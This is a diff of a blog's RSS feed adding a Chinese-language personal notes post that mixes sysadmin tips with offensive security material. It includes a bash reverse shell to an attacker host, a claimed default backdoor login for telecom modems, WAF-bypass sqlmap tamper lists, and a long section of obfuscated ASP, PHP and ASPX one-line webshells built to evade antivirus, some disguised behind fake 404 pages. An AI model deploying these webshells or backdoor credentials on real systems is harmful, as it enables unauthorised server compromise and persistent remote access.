-    python官方英文文档
-        https://docs.python.org/2.7/&lt;span class=&quot;sb&quot;&gt;
-
-    上面不能查看到的信息,eg. sys.stdout有哪些函数?方法如下:
-        python
-        import sys
-        dir(sys.stdout)
-        sys.stdout.__doc__
-            可以看出sys.stdout是个文件对象
-            文件对象的操作http://my.oschina.net/u/2252538/blog/332757
-        sys.stdout.truncate.__doc__
-        sys.stdout.close.__doc__
-        ...
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;191.&lt;/span&gt;快速查看windows是32|64位
-    dxdiag
-&lt;span class=&quot;p&quot;&gt;192.&lt;/span&gt;python在一行打印的方法
-    eg.
-    PASSWORD=password+(50-len(password))&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;&quot; &quot;
-    sys.stdout.write(&#39;-&#39;&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;(try_time&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;/(sum&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;/100))+&#39;&amp;gt;&#39;+str(try_time&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;/(sum&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;/100))+&#39;%&#39;+&#39; %s/%s %s&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&#39; % (try_time&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;,sum&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;,PASSWORD))
-    sys.stdout.flush()
-    其中password长度是变化的,使用print &quot;&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;&quot;或sys.stdout.write(&quot;&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;&quot;)想达到退格的效果无果后,考虑到的技巧:声明好
-    一个尾部是空格串的PASSWORD,将动态变化的password放入PASSWORD的最前面,这样就是每次在同一行打印长度不变的字符串了,就不会由于password由长变短后突出的长的尾巴不能用退格清除而烦恼了
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-</description>
-        <pubDate>Thu, 01 Sep 2016 22:35:59 +0800</pubDate>
-        <link>/2016/09/01/2016-08-07-my-notes/</link>
-        <guid isPermaLink="true">/2016/09/01/2016-08-07-my-notes/</guid>
-        
-        
-      </item>
     
       <item>
         <title>python多进程多线程</title>
@@ -4083,6 +2906,1189 @@ noremap wo :tabopen http://192.168.3.13:1235/webinfos &amp;lt;CR&amp;gt;
         
         
         <category>vim</category>
+        
+      </item>
+    
+      <item>
+        <title>my notes</title>
+        <description>&lt;p&gt;My updating note…&lt;/p&gt;
+
+&lt;div class=&quot;language-markdown highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;1.&lt;/span&gt;没用过的在线扫描器:
+    https://jawfish.io/
+&lt;span class=&quot;p&quot;&gt;2.&lt;/span&gt;使用python开启一个简单的http服务:
+    python - m SimpleHTTPServer 80
+&lt;span class=&quot;p&quot;&gt;3.&lt;/span&gt;serve U运行cmd:
+    quote site exec &quot;...&quot;
+&lt;span class=&quot;p&quot;&gt;4.&lt;/span&gt;账号telecomadmin密码nE7jA%5m电信猫后门
+&lt;span class=&quot;p&quot;&gt;5.&lt;/span&gt;linux local_root提权  http://exploit.linuxnote.org/
+                        https://itunsecurity.wordpress.com/2015/08/16/vulnhub-com-writeup-darknet/(LinEnum.sh,linuxprivchecker.py,unix-privesc-check)
+                        https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/?redirect
+  windows　https://github.com/GDSSecurity/Windows-Exploit-Suggester
+&lt;span class=&quot;p&quot;&gt;6.&lt;/span&gt;metasploit与postgresql数据库连接:msf &amp;gt; db_connect msf3: AtZDNVQF3NJEyNqU9u1ciHcqTsbcZzKR@127.0.0.1: 5432 / msf3
+&lt;span class=&quot;p&quot;&gt;7.&lt;/span&gt;http: // tool.chacuo.net / mailanonymous   伪造邮件发送,一小时邮箱
+&lt;span class=&quot;p&quot;&gt;8.&lt;/span&gt;bash反弹:
+    /bin/bash -i &amp;gt; /dev/tcp/&lt;span class=&quot;nt&quot;&gt;&amp;lt;attacker&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;_ip&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;/&lt;span class=&quot;nt&quot;&gt;&amp;lt;port&amp;gt;&lt;/span&gt; 0&lt;span class=&quot;err&quot;&gt;&amp;lt;&amp;amp;&lt;/span&gt;1 2&amp;gt;&amp;amp;1
+&lt;span class=&quot;p&quot;&gt;9.&lt;/span&gt;sed -i &#39;/Love/d&#39; 1.txt   删除包含Love的行
+&lt;span class=&quot;p&quot;&gt;10.&lt;/span&gt;加了vpn就相当于vpn强制给通信链路加了个限制:所有数据只能通过vpn进出.(正常联网的功能只是给系统加了连接其他地址的各种道路,必须先保证可以联网,然后可以保证加了vpn后的效果会是这样&amp;gt;&amp;gt;
+    先通过一些数据链路连接到vpn,然后vpn作为代理再访问互联网.
+&lt;span class=&quot;p&quot;&gt;11.&lt;/span&gt;tar -T mulu.list -czf file.tar.gz
+&lt;span class=&quot;p&quot;&gt;12.&lt;/span&gt;分割大文件再合并
+    split -b 20m RevolutionOS.rmvb RevOS_part_,
+    cat RevOS_part_&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &amp;gt; RevolutionOS_RSB.rmvb,
+    md5sum RevolutionOS.rmvb(md5sum RevolutionOS_RSB.rmvb)
+&lt;span class=&quot;p&quot;&gt;13.&lt;/span&gt;一些数据库操作
+  给数据库添加一个用户
+    CREATE USER &#39;username&#39;@&#39;host&#39; IDENTIFIED BY &#39;password&#39;;(可小写)
+    修改密码
+    SET PASSWORD FOR &#39;username&#39;@&#39;host&#39; = PASSWORD(&#39;newpassword&#39;);
+    修改权限
+    GRANT privileges ON databasename.tablename TO &#39;username&#39;@&#39;host&#39; WITH GRANT OPTION;(databasename.tablename可为&lt;span class=&quot;ge&quot;&gt;*.*&lt;/span&gt;,privileges可为all,注意databasename和tablename中不要有&#39;.&#39;这个标点,否则databasename.tablename不知道在哪儿算作分开,eg.gv32_cms5.1.9是数据库名,则会出错)
+
+  设置允许本机所有网卡对应ip都可以被root连接命令:
+    grant all privileges on &lt;span class=&quot;ge&quot;&gt;*.*&lt;/span&gt; to root@&#39;%&#39; identified by &#39;12345678&#39; with grant option;
+    12345678为root密码
+&lt;span class=&quot;p&quot;&gt;14.&lt;/span&gt;ip:23.23.23.23    (bing)
+&lt;span class=&quot;p&quot;&gt;15.&lt;/span&gt;暴路径http://www.lxway.com/1191778.html  
+&lt;span class=&quot;p&quot;&gt;16.&lt;/span&gt;sublime text快捷键好东西:http://www.cnblogs.com/lanxuezaipiao/p/4151095.html
+  ctrl+D,ctrl+shift+k,ctrl+shift+&lt;span class=&quot;nt&quot;&gt;&amp;lt;-&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;,按住shift右键拖动鼠标多行编辑,set syntax:python,ctrl+enter,ctrl+shift+enter,ctrl+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;,ctrl+shift+v完整粘贴源代码格式,移动一行ctrl+shift+上/下
+&lt;span class=&quot;p&quot;&gt;17.&lt;/span&gt;nmap :
+  nmap -v -sP -PI -PT -Pn 192.168.0.0/24
+  nmap -v -sn -PE 192.168.0.0/24 快速扫描局域网存活主机
+&lt;span class=&quot;p&quot;&gt;18.&lt;/span&gt;常用linux命令
+
+   head -n 1 /etc/issue   # 查看linux操作系统版本
+   getconf LONG_BIT       # 查看系统是32位还是64位
+   网络
+   
+   # ifconfig               # 查看所有网络接口的属性
+   # iptables -L            # 查看防火墙设置
+   # route -n               # 查看路由表
+   # netstat -lntp          # 查看所有  监听端口
+   # netstat -antp          # 查看所有已经建立的连接
+   # netstat -s             # 查看网络统计信息
+
+   find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*vimrc*&lt;/span&gt;&quot; | xargs grep -r &quot;linebreak&quot;
+       #在当前目录下查找文件名中包含vimrc的所有文件,并在这些文件中查https://3xp10it.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/11/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2011-0104/https://3xp10it.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/11/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2011-0104/找包含&quot;linebreak&quot;关键字的文件中的与&quot;linebreak&quot;相关的行
+&lt;span class=&quot;p&quot;&gt;19.&lt;/span&gt;linux backup and restore:&lt;span class=&quot;nt&quot;&gt;&amp;lt;sudo&amp;gt;&lt;/span&gt;
+    0&amp;gt;http://xing.rocks/2015/03/06/ubuntu%E7%B3%BB%E7%BB%9F%E5%A4%87%E4%BB%BD%E4%B8%8E%E8%BF%98%E5%8E%9F/    更详细
+    1&amp;gt;backup:
+    cd /
+    tar cvpzf linuxbackup.tgz --exclude=/proc --exclude=/lost+found --exclude=/linuxbackup.tgz --exclude=/mnt --exclude=/sys --exclude=/root/.cache /
+    2&amp;gt;restore:
+    backup the new system&#39;s /boot and /etc/fstab
+    cd /
+      tar xvpfz linuxbackup.tgz -C / 
+      mkdir proc  
+      mdkir lost+found  
+      mkdir mnt   
+      mkdir sys
+    restore the new system&#39;s backup&#39;s /boot and /etc/fstab
+      reboot
+    3&amp;gt;http://blog.csdn.net/shendl/article/details/7384755
+    4&amp;gt;https://wiki.archlinux.org/index.php/Full_system_backup_with_rsync
+&lt;span class=&quot;p&quot;&gt;20.&lt;/span&gt;python中import和from xx import xx需要注意的事:
+  import语句中:import或者from xx import xx语句当中,形如a.b的
+  用法如from a.b import f(f是b.py中一个函数名或者一个常量,a是一个文件夹,只有文件夹才
+  可以带.后接具体文件名《如此处的b&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;省略.py后缀&amp;gt;》,在具体的函数调用而不是import语句中,文件可
+  以带.后接文件中的函数或常量《如sqlmap中,在sqlmap目录下运行python,可以import tamper.sapce2comment,然
+  后运行tamper.space2comment.tamper(&quot; ajf  &quot;),但是不可以直接运行sapce2comment.tamper(&quot; ajf  &quot;),这样会报错,
+  而且以上两种情况都需要在tamper文件夹下面放一个__init__.py文件,里面的内容可以
+  为空,如果在sqlmap目录下使用from tamper import &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;则需
+  要在__init__.py里面加上__all__=&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&#39;&#39;,&#39;&#39;,&#39;&#39;...&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;,其中&#39;&#39;里面
+  是tamper目录下所有模块的模块名,这样的话就可以通过from tamper import &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;来导入所有模块了,然后
+  就可以使用如greatest.tamper(&quot;and 1&amp;gt;2&quot;)等的语句了》)
+  各tamper详解:http://www.moonsec.com/post-422.html
+  最常用--tamper=between,space2randomblank,randomcase,xforwardedfor,charencode
+  大致通用between,space2randomblank,randomcase,xforwardedfor,charencode,multiplespaces,space2plus,nonrecursivereplacement,apostrophemask,base64encode,space2mssqlhash,space2mysqldash,unionalltounion,securesphere,space2comment
+&lt;span class=&quot;p&quot;&gt;21.&lt;/span&gt;神器lfi自动探测panoptic:https://github.com/lightos/Panoptic
+   神器load_file自动探测sqlnuke:https://github.com/nuke99/sqlnuke.git
+&lt;span class=&quot;p&quot;&gt;22.&lt;/span&gt;webshell:
+  webshell generate site(good):http://www.zjjv.com/
+  good:https://r57.gen.tr/
+       http://www.dcvi.net/
+  http://www.passwaf.com/
+  http://cduan.cc/ma/index.htm
+  php-b374k(PHP version &amp;gt; 4.3.3 and PHP 5):https://github.com/b374k
+         (browser old version): https://code.google.com/p/b374k-shell/
+  http://www.dcvi.net/
+&lt;span class=&quot;p&quot;&gt;23.&lt;/span&gt;经典入侵思路:
+  http://www.2cto.com/Article/201201/115793.html(伪静态注入到获得webshell)
+&lt;span class=&quot;p&quot;&gt;24.&lt;/span&gt;cookie注入中转http://www.rising.com.cn/newsletter/news/2012-08-23/12195.html(目前认为只可asp,get)
+&lt;span class=&quot;p&quot;&gt;25.&lt;/span&gt;vpn搭建教程(2003server)http://www.xfisp.com/style/info/shownews.asp?id=3(pptp)
+                         http://vps.gl/windows/215.html  http://help.fireinter.com/tengxunyun/2015/0203/354.html(l2tp)
+&lt;span class=&quot;p&quot;&gt;26.&lt;/span&gt;关于ipcam的UPnP或NAT的知识http://www.pernet.tv/thread-103-1-1.html
+&lt;span class=&quot;p&quot;&gt;27.&lt;/span&gt;google search api(good):http://www.catonmat.net/blog/python-library-for-google-search/ (not good now   xgoogle)
+   google translate api(good):http://www.catonmat.net/blog/python-library-for-google-translate/   (not good now   xgoogle)
+   (little good can search&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;inurl:index.php?option=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;,but not(&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;site:*.edu inurl:inurl.php?option=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;)) https://pypi.python.org/pypi/Google-Search-API
+   (guan_fang)google search api:http://scriptsonscripts.blogspot.com/2015/02/python-google-search-api-requests.html    ajax-&amp;gt;json-&amp;gt;guan_fang(custom search api,100 results per day for free user)
+   (good_GoogleScraper,!-s (google,yahoo,bing..))google search api:http://incolumitas.com/2013/01/06/googlesearch-a-rapid-python-class-to-get-search-results/    or    https://github.com/NikolaiT/GoogleScraper/blob/master/README.md
+   two links may mean (guan_fang)custom search api
+   may helpful:https://google-api-client-libraries.appspot.com/documentation/customsearch/v1/python/latest/customsearch_v1.cse.html
+   may helpful:https://github.com/google/google-api-python-client/tree/master/samples/customsearch
+   may helpful:http://wescpy.blogspot.com/2014/09/simple-google-api-access-from-python.html   http://wescpy.blogspot.com/2014/11/authorized-google-api-access-from-python.html
+   具体详情见百度云盘笔记文件夹
+&lt;span class=&quot;p&quot;&gt;28.&lt;/span&gt;.NET reverse tool(graywolf):https://www.digitalbodyguard.com/graywolf.html
+&lt;span class=&quot;p&quot;&gt;29.&lt;/span&gt;linux fdisk-&amp;gt;ext3-&amp;gt;mount:http://cuchadanfan.blog.51cto.com/9940284/1671416
+&lt;span class=&quot;p&quot;&gt;30.&lt;/span&gt;Cknife  java环境菜刀  已放到/usr/share
+&lt;span class=&quot;p&quot;&gt;31.&lt;/span&gt;免杀一句话:http://blog.hacku.cn/post/260.html
+           http://www.freebuf.com/articles/web/9396.html
+           kali linux2.0:
+            webacoo
+            weevely
+   asp:
+   &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%execute(unescape(&quot;eval%20request%28%222016%22%29&quot;))%&amp;gt;          key:2016
+
+   &amp;lt;%
+   dim a,b,temp,c
+   a=&quot;eva@@l%20req@@uest%28%22helloxj%22%29&quot;
+   b=replace(a,&quot;@@&quot;,&quot;零&quot;)
+   c=split(b,&quot;零&quot;)
+   for i=0 to ubound(c)
+   temp=temp+c(i)
+   next
+   execute(unescape(temp))
+   %&amp;gt;
+                        key:helloxj
+
+   &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%Y=request(&quot;shezhang&quot;)%&amp;gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%execute(Y)%&amp;gt;
+    
+   &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%eval(eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(&quot;shezhang&quot;))%&amp;gt;
+    
+   &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%eval&quot;&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;(&quot;e&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;v&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;a&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;l&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;(&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;r&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;e&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;q&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;u&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;e&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;s&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;t&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;(&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;0&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;-&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;2&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;-&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;5&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;)&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;)&quot;)%&amp;gt;(密码是-7)
+
+   php:
+   &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php $a = base64_decode(Y.X.N.z.Z.X.J01);$a($_POST[g]);?&amp;gt;&lt;/span&gt;       key:g
+   &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php $x_x=base64_decode(Y.X.N.z.Z.X.J01);$x_x(($_POST[$_GET[a]]));?&amp;gt;&lt;/span&gt;        key:the value of &quot;a&quot;
+   &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php$a=str_replace(x,&quot;&quot;,&quot;axsxxsxexrxxt&quot;);$a($_POST[&quot;shezhang&quot;]);?&amp;gt;&lt;/span&gt;
+    
+   &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php$lang=(string)key($_POST);$lang($_POST[&#39;shezhang&#39;]);?&amp;gt;&lt;/span&gt;
+    
+   test&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php$k=&quot;ass&quot;.&quot;ert&quot;;$k(${&quot;_PO&quot;.&quot;ST&quot;}[&#39;nihao&#39;]);?&amp;gt;&lt;/span&gt;
+    
+   &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php $a=&quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;; $a($_POST[&quot;shezhang&quot;]); ?&amp;gt;&lt;/span&gt;
+    
+   &amp;lt;?php         
+   @$_=&quot;s&quot;.&quot;s&quot;./&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/&quot;e&quot;./*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/&quot;r&quot;;         
+   @$_=/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/&quot;a&quot;./*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/$_./&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;/&quot;t&quot;;         
+   @$_/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/($/*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/{&quot;_P&quot;./&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/&quot;OS&quot;./*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/&quot;T&quot;}         
+   &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;);?&amp;gt;  密码是 -7
+   &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php if(!$_POST[&#39;nihao&#39;]){header(&#39;HTTP/1.1 404 Not Found&#39;); exit(); }else{ $s=&quot;p&quot;.&quot;r&quot;.&quot;e&quot;.&quot;g&quot;.&quot;_&quot;.&quot;r&quot;.&quot;e&quot;.&quot;p&quot;.&quot;l&quot;.&quot;a&quot;.&quot;c&quot;.&quot;e&quot;; @$s(&quot;~[discuz]~e&quot;,$_POST[&#39;nihao&#39;],&quot;Access denied&quot;); } ?&amp;gt;&lt;/span&gt;
+
+   
+   &lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;404 Not Found&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Not Found&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;The requested URL was not found on this server.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+   &amp;lt;?php
+   ($b4dboy = $_POST&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&#39;nihao&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;) &amp;amp;&amp;amp; @preg_replace(&#39;/ad/e&#39;,&#39;@&#39;.str_rot13(&#39;riny&#39;).&#39;($b4dboy)&#39;, &#39;add&#39;); 
+   header(&#39;HTTP/1.1 404 Not Found&#39;);
+   ?&amp;gt;
+
+   &amp;lt;?php
+   include &#39;xxoo.jpg&#39;;
+   ?&amp;gt;
+   xxoo.jpg为一句话图片木马,此php后门中在win下菜刀连接只能看到木马所在盘符文件,其他盘符磁盘下文件默认在菜刀中不可加载,也看不到,但是可通过虚拟终端&quot;dir 盘符:&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;
+   看到,对文件也有操作权限,在linux下可看到所有文件,该版本不被查杀
+
+   &amp;lt;?php
+   $file = fopen(&quot;test.php&quot;,&quot;w&quot;);
+   fwrite($file,$_REQUEST&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;);
+   fclose($file);
+   ?&amp;gt;
+   该版本不被查杀,且比上面一个更安全&lt;span class=&quot;sb&quot;&gt;
+
+
+&lt;/span&gt;   aspx:
+   ASPX一句话的过安全狗效果不怎么样,不过我认为能支持aspx百分之8/90支持asp
+   &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%@PageLanguage=Jscript%&amp;gt;      
+   &amp;lt;%var/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/P/*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/=/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/&quot;e&quot;+&quot;v&quot;+/*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/
+   &quot;a&quot;+&quot;l&quot;+&quot;(&quot;+&quot;R&quot;+&quot;e&quot;+/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/&quot;q&quot;+&quot;u&quot;+&quot;e&quot;/*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/+&quot;s&quot;+&quot;t&quot;+      
+   &quot;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&quot;+      
+   &quot;,&quot;+&quot;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&quot;+&quot;u&quot;+&quot;n&quot;+&quot;s&quot;/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;/+&quot;a&quot;+&quot;f&quot;+&quot;e&quot;+&quot;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&quot;+&quot;)&quot;;eval      
+   (/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/P/*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/,/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/&quot;u&quot;+&quot;n&quot;+&quot;s&quot;/*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/+&quot;a&quot;+&quot;f&quot;+&quot;e&quot;/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;/);%&amp;gt;  密码 -7
+    
+    
+   &lt;span class=&quot;nv&quot;&gt;&amp;lt;%@PageLanguage=&quot;Jscript&quot;%&amp;gt;&amp;lt;%eval(Request.Item[&quot;shezhang&quot;],&quot;unsafe&quot;);%&amp;gt;&lt;/span&gt;
+    
+    
+   &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;language=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;C#&quot;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;runat=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;server&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;      
+   WebAdmin2Y.x.yaaaaa=newWebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;);      
+   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;                              密码是webadmin
+
+   aspx隐藏一句话新:http://z-cg.com/?mod=pad&lt;span class=&quot;ni&quot;&gt;&amp;amp;act=view&amp;amp;id=10(&amp;lt;%WebServices.ShowRunnerVersion();&lt;/span&gt;%&amp;gt;,&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%WebServices.InitializeWebServices(&quot;fuck&quot;);%&amp;gt;)
+&lt;span class=&quot;p&quot;&gt;31.&lt;/span&gt;windows local privileges:http://www.52wa.net/post-198.html
+                            http://le4f.net/post/post/windows-x64-local-privilege-escalation
+                            https://forum.90sec.org/forum.php?mod=viewthread&amp;amp;tid=9067#lastpost
+                            https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp
+                            http://www.freebuf.com/articles/web/76892.html
+                            https://github.com/foxglovesec/Potato
+                            in meterpreter:
+                            meterpreter&amp;gt;background
+                            msf&amp;gt;use post/multi/recon/local_exploit_suggester 
+                            msf&amp;gt;show options
+                            msf&amp;gt;exploit
+                            or  
+                            meterpreter&amp;gt;run post/multi/recon/local_exploit_suggester
+&lt;span class=&quot;p&quot;&gt;32.&lt;/span&gt;phpstudy for linux:
+  wget -c http://lamp.phpstudy.net/phpstudy.bin?
+  chmod +x phpstudy.bin
+  # 权限设置
+  ./phpstudy.bin     #运行安装
+
